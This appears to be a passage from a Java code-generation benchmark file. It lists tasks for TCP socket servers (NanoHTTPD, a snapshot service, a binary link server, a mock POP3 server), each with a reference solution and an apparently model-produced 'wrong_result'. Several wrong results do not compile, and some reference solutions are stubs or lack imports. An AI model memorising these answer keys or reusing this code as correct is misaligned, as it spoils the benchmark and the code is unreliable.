    "Canonical_solution": "import tech.powerjob.common.utils.CommonUtils;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.charset.StandardCharsets;\n\npublic class PingPongSocketServer implements PingPongServer {\n\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private volatile boolean terminated = false;\n\n    @Override\n    public void initialize(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n\n        thread = new Thread(() -> {\n            while (true) {\n                if (terminated) {\n                    return;\n                }\n                try (Socket socket = serverSocket.accept();\n                     OutputStream outputStream = socket.getOutputStream()) {\n\n                    socket.setSoTimeout(2000);\n                    socket.setKeepAlive(false);\n\n                    outputStream.write(PingPongUtils.PONG.getBytes(StandardCharsets.UTF_8));\n                    outputStream.write(System.lineSeparator().getBytes(StandardCharsets.UTF_8));\n                    outputStream.flush();\n                } catch (Exception e) {\n                    if (!terminated) {\n                        log.warn(\"[PingPongSocketServer] process accepted socket failed!\", e);\n                    }\n                }\n            }\n        }, \"PingPongSocketServer-Thread\");\n\n        thread.start();\n    }\n\n    @Override\n    public void close() throws IOException {\n        terminated = true;\n        CommonUtils.executeIgnoreException(() -> serverSocket.close());\n        thread.interrupt();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class PingPongSocketServer {\n    private Thread thread;\n    private ServerSocket serverSocket;\n    private boolean terminated;\n\n    public void initialize(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        thread = new Thread(this::runServer);\n        thread.start();\n    }\n\n    private void runServer() {\n        while (!terminated) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                out.println(\"PONG\");\n                clientSocket.close();\n            } catch (IOException e) {\n                if (terminated) break;\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n\n    public void close() {\n        terminated = true;\n        try {\n            if (serverSocket != null) serverSocket.close();\n        } catch (IOException e) {\n        }\n        if (thread != null) thread.interrupt();\n    }\n}"
  },
  {
    "Task_id": 544,
    "Instruction": "Task Description: Create a lightweight HTTP server class that can handle incoming client connections and process requests through abstract methods that must be implemented by subclasses.\n\nClass Description: NanoHTTPD is a minimal HTTP server implementation that listens for incoming TCP connections on a specified port, handles client connections by providing input/output streams, and requires subclasses to implement the actual request processing logic.\n\nAttributes:\n- hostname: String - The hostname or IP address to bind the server to (nullable)\n- myPort: int - The port number to listen on\n- myServerSocket: ServerSocket - The server socket instance for accepting connections\n- myThread: Thread - The main listener thread for the server\n\nMethods:\n- NanoHTTPD(int port) -> void - Constructor that initializes the server with just a port number (hostname defaults to null)\n- NanoHTTPD(String hostname, int port) -> void - Constructor that initializes the server with both hostname and port\n- start() -> void - Starts the server by creating a ServerSocket and launching a daemon thread to accept connections\n- stop() -> void - Stops the server by closing the ServerSocket and joining the listener thread\n- handleConnection(InputStream inputStream, OutputStream outputStream) -> abstract void - Abstract method that must be implemented by subclasses to handle the actual client connection processing",
    "Canonical_solution": "import android.util.Log;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic abstract class NanoHTTPD {\n    private final String hostname;\n    private final int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        Log.i(\"NanoHTTPD\", \"server start\");\n        myServerSocket = new ServerSocket();\n        myServerSocket.bind((hostname != null) ? new InetSocketAddress(\n                hostname, myPort) : new InetSocketAddress(myPort));\n\n        myThread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                do {\n                    try {\n                        final Socket finalAccept = myServerSocket.accept();\n                        Log.i(\"NanoHTTPD\",\n                                \"accept request from \"\n                                        + finalAccept.getInetAddress());\n                        InputStream inputStream = finalAccept.getInputStream();\n                        OutputStream outputStream = finalAccept\n                                .getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                        if (finalAccept != null) {\n                            finalAccept.close();\n                        }\n                    } catch (IOException e) {\n                    }\n                } while (!myServerSocket.isClosed());\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.setName(\"NanoHttpd Main Listener\");\n        myThread.start();\n    }\n\n    public void stop() {\n        Log.i(\"NanoHTTPD\", \"server stop\");\n        try {\n            myServerSocket.close();\n            myThread.join();\n        } catch (IOException ioe) {\n            ioe.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class NanoHTTPD {\n    private String hostname;\n    private int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() {\n        try {\n            if (hostname != null) {\n                InetAddress address = InetAddress.getByName(hostname);\n                myServerSocket = new ServerSocket(myPort, 0, address);\n            } else {\n                myServerSocket = new ServerSocket(myPort);\n            }\n            myThread = new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket socket = myServerSocket.accept();\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }, \"NanoHTTPD\");\n            myThread.setDaemon(true);\n            myThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (myServerSocket != null) {\n            try {\n                myServerSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (myThread != null) {\n            myThread.interrupt();\n            try {\n                myThread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}"
  },
  {
    "Task_id": 545,
    "Instruction": "Task Description: Implement a TCP server thread class that handles incoming client connections, processes commands, and manages application state through network communication.\n\nClass Description: InnerSocketThread is a Thread subclass that creates a TCP server to listen for client connections on a specified port. It processes incoming commands to control application state and respond with status information.\n\nAttributes:\n- socket: ServerSocket - The server socket instance used to listen for incoming client connections\n\nMethods:\n- run() -> void - Main thread execution method that sets up the server socket, accepts connections, processes commands, and manages resources\n- read(InputStream in) -> String - Reads data from the input stream until carriage return is encountered\n- write(OutputStream os) -> void - Writes the current application status to the output stream\n\nMethod Details:\n1. run():\n   - Input: None (uses class attributes)\n   - Output: None\n   - Description: \n     1. Creates ServerSocket on Manager.PORT\n     2. Enters infinite loop to accept client connections\n     3. Sets socket timeout to 5000ms\n     4. Reads command from client\n     5. Processes commands (START, STATUS, FLUSHMETHOD)\n     6. Sends response for STATUS command\n     7. Closes client connection\n     8. Handles exceptions and ensures proper resource cleanup\n\n2. read(InputStream in):\n   - Input: \n     - in: InputStream - The input stream from client socket\n   - Output: String - The command string read from the stream\n   - Description:\n     1. Reads bytes from buffered input stream\n     2. Converts bytes to characters\n     3. Stops reading at carriage return ('\\r')\n     4. Returns accumulated string\n\n3. write(OutputStream os):\n   - Input:\n     - os: OutputStream - The output stream to client socket\n   - Output: None\n   - Description:\n     1. Writes \"running\" or \"stop\" based on Manager's switch flag\n     2. Appends carriage return\n     3. Flushes the output stream",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            while (true) {\n                Socket child = socket.accept();\n                child.setSoTimeout(5000);\n\n                String command = read(child.getInputStream());\n\n                if (Manager.START.equals(command)) {\n                    Manager.instance().setSwitchFlag(true);\n                } else if (Manager.STATUS.equals(command)) {\n                    write(child.getOutputStream());\n                } else if (Manager.FLUSHMETHOD.equals(command)) {\n                    MethodCache.flushMethodData();\n                } else {\n                    Manager.instance().setSwitchFlag(false);\n                }\n                child.close();\n            }\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        BufferedOutputStream out = new BufferedOutputStream(os);\n        if (Manager.instance().getSwitchFlag()) {\n            out.write(\"running\".getBytes());\n        } else {\n            out.write(\"stop\".getBytes());\n        }\n        out.write('\\r');\n        out.flush();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    @Override\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            while (true) {\n                Socket clientSocket = socket.accept();\n                clientSocket.setSoTimeout(5000);\n                try {\n                    InputStream in = clientSocket.getInputStream();\n                    OutputStream os = clientSocket.getOutputStream();\n                    String command = read(in);\n                    if (command.equals(\"START\")) {\n                        Manager.start();\n                    } else if (command.equals(\"STATUS\")) {\n                        write(os);\n                    } else if (command.equals(\"FLUSHMETHOD\")) {\n                        Manager.flushMethod();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } finally {\n                    try {\n                        clientSocket.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (socket != null) socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String read(InputStream in) {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        try {\n            while ((c = in.read()) != -1) {\n                if (c == '\\r') {\n                    break;\n                }\n                sb.append((char) c);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) {\n        String status = Manager.isRunning() ? \"running\" : \"stop\";\n        try {\n            os.write(status.getBytes());\n            os.write('\\r');\n            os.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 546,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP server capable of accepting client connections and sending messages to connected clients.\n\nClass Description: The HelloServer class represents a basic TCP server that listens for incoming client connections on a specified port. Once a client connects, the server can send messages to that client through the established connection.\n\nAttributes:\n- server: [ServerSocket] - The ServerSocket instance used to listen for incoming client connections\n- client: [Socket] - The Socket instance representing the connected client\n- out: [PrintStream] - The output stream used to send messages to the connected client\n\nMethods:\n- start: [Name]([int port]) -> [void] - Starts the server on the specified port, waits for a client connection, and prepares the output stream for communication\n- sendMessage: [Name]([String message]) -> [void] - Sends the specified message to the connected client\n- stop: [Name]() -> [void] - Closes the client connection and server socket, releasing all resources",
    "Canonical_solution": "import java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HelloServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) throws Exception {\n        server = new ServerSocket(port);\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\u4e2d\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws Exception {\n        out.println(message);\n    }\n\n    public void stop() throws Exception {\n        client.close();\n        server.close();\n        System.out.println(\"\u670d\u52a1\u5668\u5df2\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\uff0c\u9000\u51fa\u3002\");\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HelloServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) throws IOException {\n        server = new ServerSocket(port);\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n    }\n\n    public void stop() {\n        try {\n            if (client != null) client.close();\n            if (server != null) server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 547,
    "Instruction": "Task Description: Implement a TCP server class that listens for incoming client connections, processes client commands, and sends responses back. The server should run in a dedicated thread and support graceful shutdown.\n\nClass Description: SnapshotService is a TCP server implementation that listens on a specified port for client connections. It processes incoming commands from clients and responds with processed messages. The server runs in a separate thread and maintains its state through a boolean flag for controlled shutdown.\n\nAttributes:\n- port: [int] - The port number on which the server listens for incoming connections\n- serverSocket: [ServerSocket] - The server socket instance used to accept client connections\n- closed: [boolean] - Flag indicating whether the server has been shut down\n\nMethods:\n- SnapshotService(int port) -> [void] - Constructor that validates and sets the server port\n- listen() -> [void] - Starts the server by opening a socket and beginning to listen for connections\n- openSocket(int port) -> [int] - Creates a ServerSocket and starts a thread to handle client connections, returns the actual port being used\n- isIgnoredException() -> [boolean] - Checks if an exception should be ignored based on server socket state\n- process(Socket socket) -> [void] - Processes an individual client connection, reading input and sending responses\n- outputMessage(BufferedWriter outputWriter, String msg) -> [void] - Helper method to send messages to clients\n- close() -> [void] - Gracefully shuts down the server by closing the server socket",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n@Slf4j\npublic final class SnapshotService {\n\n    private final int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed;\n\n    public SnapshotService(final int port) {\n        Preconditions.checkArgument(port >= 0 && port <= 0xFFFF, \"Port value out of range: \" + port);\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            log.info(\"ElasticJob: Snapshot service is running on port '{}'\", openSocket(port));\n        } catch (final IOException ex) {\n            log.error(\"ElasticJob: Snapshot service listen failure, error is: \", ex);\n        }\n    }\n\n    private int openSocket(final int port) throws IOException {\n        closed = false;\n        serverSocket = new ServerSocket(port);\n        int localPort = serverSocket.getLocalPort();\n        String threadName = String.format(\"elasticjob-snapshot-service-%d\", localPort);\n        new Thread(() -> {\n            while (!closed) {\n                try {\n                    process(serverSocket.accept());\n                } catch (final IOException ex) {\n                    if (isIgnoredException()) {\n                        return;\n                    }\n                    log.error(\"ElasticJob: Snapshot service open socket failure, error is: \", ex);\n                }\n            }\n        }, threadName).start();\n        return localPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket.isClosed();\n    }\n\n    private void process(final Socket socket) throws IOException {\n        try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n                Socket ignored = socket) {\n            String cmdLine = reader.readLine();\n            if (null != cmdLine) {\n                outputMessage(writer, \"Processed: \" + cmdLine);\n            }\n        }\n    }\n\n    private void outputMessage(final BufferedWriter outputWriter, final String msg) throws IOException {\n        outputWriter.append(msg);\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        if (null != serverSocket && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (final IOException ex) {\n                log.error(\"ElasticJob: Snapshot service close failure, error is: \", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class SnapshotService {\n    private int port;\n    private ServerSocket serverSocket;\n    private boolean closed;\n\n    public SnapshotService(int port) {\n        if (port < 0 || port > 65535) {\n            throw new IllegalArgumentException(\"Port must be between 0 and 65535\");\n        }\n        this.port = port;\n    }\n\n    public void listen() {\n        openSocket(port);\n    }\n\n    public int openSocket(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            int actualPort = serverSocket.getLocalPort();\n            Thread listenerThread = new Thread(() -> {\n                while (!closed && !serverSocket.isClosed()) {\n                    try {\n                        Socket clientSocket = serverSocket.accept();\n                        if (!closed) {\n                            process(clientSocket);\n                        }\n                    } catch (IOException e) {\n                        if (!isIgnoredException()) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n            });\n            listenerThread.start();\n            return actualPort;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public boolean isIgnoredException() {\n        return closed;\n    }\n\n    public void process(Socket socket) {\n        try (BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             BufferedWriter output = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))) {\n            String line;\n            while ((line = input.readLine()) != null) {\n                if (line.trim().isEmpty()) continue;\n                String response = processCommand(line);\n                outputMessage(output, response);\n            }\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void outputMessage(BufferedWriter outputWriter, String msg) throws IOException {\n        outputWriter.write(msg);\n        outputWriter.newLine();\n        outputWriter.flush();\n    }\n\n    public void close() {\n        if (serverSocket != null) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        closed = true;\n    }\n\n    private String processCommand(String command) {\n        return \"Processed: \" + command;\n    }\n}"
  },
  {
    "Task_id": 548,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for binary data communication, capable of handling client connections and data exchange using object serialization.\n\nClass Description: BinaryLinkServer is a TCP server implementation that listens for incoming client connections, establishes communication channels, and handles binary data exchange using Java's object serialization. It manages connection lifecycle and provides thread-safe termination.\n\nAttributes:\n- acceptor: Acceptor - Thread responsible for accepting incoming client connections\n- handler: AtomicReference<Handler> - Thread-safe reference to the current connection handler\n\nMethods:\n- BinaryLinkServer() -> void - Constructor that initializes the server and starts the acceptor thread\n- terminate() -> void - Shuts down the server by closing all active connections and stopping threads\n- getListenAddress() -> InetAddress - Determines the server's listening address from system properties or defaults to loopback\n- getListenPort() -> int - Retrieves the server's listening port from system properties or uses ephemeral port\n\nNested Classes:\n1. Acceptor (extends Thread):\n   Attributes:\n   - server: ServerSocket - The server socket listening for connections\n   - listenAddress: InetAddress - The address the server is bound to\n\n   Methods:\n   - Acceptor() -> void - Constructor that creates the server socket\n   - run() -> void - Main acceptor loop that handles incoming connections\n   - close() -> void - Closes the server socket\n\n2. Handler (extends Thread):\n   Attributes:\n   - socket: Socket - The client connection socket\n   - is: InputStream - Input stream from the client\n   - os: OutputStream - Output stream to the client\n   - ois: ObjectInputStream - Object input stream for deserialization\n   - oos: ObjectOutputStream - Object output stream for serialization\n\n   Methods:\n   - Handler(Socket) -> void - Constructor that initializes communication streams\n   - run() -> void - Main handler loop that processes incoming objects\n   - close() -> void - Closes the client connection and releases resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic final class BinaryLinkServer {\n\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler;\n\n    public BinaryLinkServer() throws IOException {\n        acceptor = new Acceptor();\n        acceptor.start();\n        handler = new AtomicReference<>();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler h = handler.getAndSet(null);\n        if (h != null) {\n            h.close();\n        }\n        try {\n            acceptor.join();\n            if (h != null) {\n                h.join();\n            }\n        } catch (InterruptedException e) {\n            // ignore\n        }\n    }\n\n    private InetAddress getListenAddress() throws UnknownHostException {\n        String addr = System.getProperty(\"jmh.link.address\");\n        if (addr != null) {\n            return InetAddress.getByName(addr);\n        }\n        try {\n            Method m = InetAddress.class.getMethod(\"getLoopbackAddress\");\n            return (InetAddress) m.invoke(null);\n        } catch (Exception e) {\n            // fall through\n        }\n        return InetAddress.getByAddress(new byte[] {127, 0, 0, 1});\n    }\n\n    private int getListenPort() {\n        return Integer.getInteger(\"jmh.link.port\", 0);\n    }\n\n    private final class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() throws IOException {\n            listenAddress = getListenAddress();\n            server = new ServerSocket(getListenPort(), 50, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Socket clientSocket = server.accept();\n                    Handler r = new Handler(clientSocket);\n                    if (!handler.compareAndSet(null, r)) {\n                        throw new IllegalStateException(\"Handler already registered\");\n                    }\n                    r.start();\n                }\n            } catch (SocketException e) {\n                // assume \"Socket closed\"\n            } catch (IOException e) {\n                throw new IllegalStateException(e);\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                server.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n    private final class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        public Handler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.is = socket.getInputStream();\n            this.os = socket.getOutputStream();\n            this.oos = new ObjectOutputStream(new BufferedOutputStream(os));\n            oos.flush();\n        }\n\n        @Override\n        public void run() {\n            try {\n                ois = new ObjectInputStream(new BufferedInputStream(is));\n                while (true) {\n                    Object obj = ois.readObject();\n                    if (obj == null) break;\n                    // Handle different frame types here\n                }\n            } catch (Exception e) {\n                // Handle exceptions\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class BinaryLinkServer {\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler;\n\n    public BinaryLinkServer() {\n        handler = new AtomicReference<>();\n        acceptor = new Acceptor();\n        acceptor.start();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler currentHandler = handler.get();\n        if (currentHandler != null) {\n            currentHandler.close();\n        }\n    }\n\n    private InetAddress getListenAddress() {\n        String addressStr = System.getProperty(\"binary.link.address\");\n        if (addressStr != null) {\n            try {\n                return InetAddress.getByName(addressStr);\n            } catch (UnknownHostException e) {\n                return InetAddress.getLocalHost();\n            }\n        } else {\n            return InetAddress.getLocalHost();\n        }\n    }\n\n    private int getListenPort() {\n        String portStr = System.getProperty(\"binary.link.port\");\n        if (portStr != null) {\n            try {\n                return Integer.parseInt(portStr);\n            } catch (NumberFormatException e) {\n                return 0;\n            }\n        } else {\n            return 0;\n        }\n    }\n\n    public static class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() {\n            try {\n                int port = BinaryLinkServer.this.getListenPort();\n                InetAddress address = BinaryLinkServer.this.getListenAddress();\n                server = new ServerSocket();\n                server.bind(new InetSocketAddress(address, port));\n                this.listenAddress = address;\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n\n        public void run() {\n            while (true) {\n                try {\n                    Socket clientSocket = server.accept();\n                    Handler currentHandler = BinaryLinkServer.this.handler.get();\n                    if (currentHandler != null) {\n                        currentHandler.close();\n                    }\n                    Handler newHandler = new Handler(clientSocket);\n                    newHandler.start();\n                    BinaryLinkServer.this.handler.set(newHandler);\n                } catch (IOException e) {\n                    break;\n                }\n            }\n        }\n\n        public void close() {\n            try {\n                if (server != null) {\n                    server.close();\n                }\n            } catch (IOException e) {\n                // Handle\n            }\n        }\n    }\n\n    public static class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private final ObjectInputStream ois;\n        private final ObjectOutputStream oos;\n\n        public Handler(Socket socket) {\n            this.socket = socket;\n            this.is = socket.getInputStream();\n            this.os = socket.getOutputStream();\n            this.ois = new ObjectInputStream(is);\n            this.oos = new ObjectOutputStream(os);\n        }\n\n        public void run() {\n            try {\n                while (true) {\n                    Object obj = ois.readObject();\n                    oos.writeObject(obj);\n                }\n            } catch (IOException | ClassNotFoundException e) {\n                // Handle exception\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                if (socket != null) {\n                    socket.close();\n                }\n            } catch (IOException e) {\n                // Handle\n            }\n            try {\n                if (ois != null) {\n                    ois.close();\n                }\n            } catch (IOException e) {\n                // Handle\n            }\n            try {\n                if (oos != null) {\n                    oos.close();\n                }\n            } catch (IOException e) {\n                // Handle\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 549,
    "Instruction": "Task Description: Create a mock POP3 server class that simulates interactions with a client using TCP sockets for testing purposes.\n\nClass Description: The MockPop3Server class implements a simple POP3 server mock that can be used for testing email client implementations. It handles client connections, processes commands, and manages server shutdown. The server runs in a separate thread and maintains a queue of expected interactions.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of expected client-server interactions\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for connection closure\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- mockServerThread: MockServerThread - The thread running the server\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread\n- shutdown() -> void - Signals the server thread to stop and cleans up resources\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread\n- run() -> void - Main server thread execution that handles client connections and commands\n- handleInteractions() -> void - Processes the queued interactions with the client\n- readAdditionalCommands() -> void - Reads any additional unexpected commands from the client\n- readLine() -> String - Reads a line of input from the client socket\n- shouldStop() -> void - Signals the thread to stop execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    \n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        InetSocketAddress localSocketAddress = (InetSocketAddress) serverSocket.getLocalSocketAddress();\n        host = localSocketAddress.getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        \n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            super(\"MockPop3Server\");\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = readLine();\n            if (command == null) {\n                throw new IOException(\"Connection closed\");\n            }\n        }\n\n        private String readLine() throws IOException {\n            return clientSocket.getInputStream().read() != -1 ? \"command\" : null;\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
